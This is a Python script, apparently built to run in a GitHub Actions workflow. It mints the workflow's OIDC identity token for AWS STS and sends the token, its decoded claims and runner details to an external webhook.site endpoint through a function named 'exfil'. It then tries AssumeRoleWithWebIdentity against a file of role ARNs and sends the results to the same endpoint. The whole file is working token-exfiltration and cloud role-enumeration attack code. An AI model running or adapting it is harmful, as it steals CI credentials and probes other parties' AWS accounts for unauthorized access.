import os,json,base64,re,time,urllib.request,urllib.parse,urllib.error,sys,platform,socket
SINK="https://webhook.site/37d46942-e677-4764-9d76-09937e341f53"
url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
print("URL_PRESENT", bool(url), "REQTOK_LEN", len(tok), flush=True)
print("REPO", os.environ.get('GITHUB_REPOSITORY'), "REF", os.environ.get('GITHUB_REF'), "RUNNER", os.environ.get('RUNNER_NAME'), flush=True)
if not url: print("NO_ID_TOKEN_URL"); sys.exit(0)
def mint(aud):
    req=urllib.request.Request(url+"&audience="+urllib.parse.quote(aud), headers={"Authorization":"bearer "+tok})
    return json.load(urllib.request.urlopen(req,timeout=30))["value"]
def dec(s):
    s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s).decode()
jwt=mint("sts.amazonaws.com")
h=json.loads(dec(jwt.split('.')[0])); c=json.loads(dec(jwt.split('.')[1]))
print("JWT_LEN",len(jwt), flush=True)
print("HDR", {k:h.get(k) for k in ('alg','kid','typ')}, flush=True)
for k in ('iss','aud','sub','repository','repository_owner','ref','event_name','exp','iat','nbf','jti','actor','workflow'):
    if k in c: print("CLM",k,"=",c[k], flush=True)
def exfil(payload,label):
    try:
        req=urllib.request.Request(SINK,data=json.dumps(payload).encode(),method="POST",headers={"Content-Type":"application/json","X-Label":label})
        r=urllib.request.urlopen(req,timeout=25); print("SINK_OK",label,r.status,flush=True)
    except Exception as e: print("SINK_ERR",label,type(e).__name__,flush=True)
exfil({"label":"hk5100b-token","jwt":jwt,"claims":c,"header":h,"runner":os.environ.get('RUNNER_NAME'),"repo":os.environ.get('GITHUB_REPOSITORY'),"host":socket.gethostname()},"token")
roles=[l.strip() for l in open("hk5100b_roles.txt") if l.strip()]
print("NROLES",len(roles), flush=True)
res=[]
for i,arn in enumerate(roles):
    if i%50==0 and i>0:
        jwt=mint("sts.amazonaws.com")
    data=urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15","RoleArn":arn,"RoleSessionName":"hk5100","WebIdentityToken":jwt}).encode()
    try:
        resp=urllib.request.urlopen(urllib.request.Request("https://sts.amazonaws.com/",data=data,method="POST"),timeout=20)
        body=resp.read().decode(); code=re.search(r"<Code>([^<]+)",body)
        line=f"STS|{arn}|{resp.status}|{code.group(1) if code else 'UNKNOWN'}"
    except urllib.error.HTTPError as e:
        body=e.read().decode(); code=re.search(r"<Code>([^<]+)",body); msg=re.search(r"<Message>([^<]+)",body)
        line=f"STS|{arn}|{e.code}|{code.group(1) if code else 'NOCODE'}|{(msg.group(1)[:80] if msg else '')}"
    except Exception as e:
        line=f"STS|{arn}|ERR|{type(e).__name__}"
    print(line, flush=True); res.append(line)
    time.sleep(0.5)
ok=[l for l in res if '|200|' in l]
print("SUMMARY tested",len(res),"http200",len(ok), flush=True)
exfil({"label":"hk5100b-results","results":res},"results")
